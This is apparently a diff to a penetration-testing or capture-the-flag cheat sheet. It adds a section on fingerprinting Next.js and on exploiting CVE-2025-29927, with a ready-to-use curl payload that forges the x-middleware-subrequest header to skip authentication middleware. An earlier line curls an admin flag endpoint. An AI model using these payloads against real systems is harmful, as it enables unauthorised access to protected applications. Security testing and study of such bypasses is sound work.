@@ -74,4 +74,30 @@ Payment Card Industry Data Security Standard
    `curl -b cookies.txt http://target:3000/api/admin/flag`
 
 
+## Next.js
+
+- **`X-Powered-By: Next.js`** header  
+- **HTML source contains `window.__next_f`** (definitive App Router indicator)  
+- Static asset paths: `/_next/static/chunks/`  
+- `x-nextjs-cache` and `x-nextjs-prerender` headers
+
+> **Note:** Development mode (`next dev`) is **not** vulnerable. Production build (`npm run build && npm start`) is required.
+
+
+#### CVE-2025-29927 – Middleware Authentication Bypass (CVSS 9.1 Critical)
+
+**What it is:**  
+Next.js uses an internal header `x-middleware-subrequest` to prevent infinite loops when middleware calls itself. The framework never validated if the header came from an internal process or an external client.
+
+**Attack:**  
+Send the header with your request to skip middleware entirely (bypass authentication, session checks, etc.).
+
+**Payload format:**  
+```bash
+curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://target/dashboard
+```
+- For root-level `middleware.ts` → `middleware` repeated 5 times
+- For `src/middleware.ts` → `src/middleware` repeated 5 times
+
+**Result:** Access protected routes (e.g., `/dashboard`) without login.
 
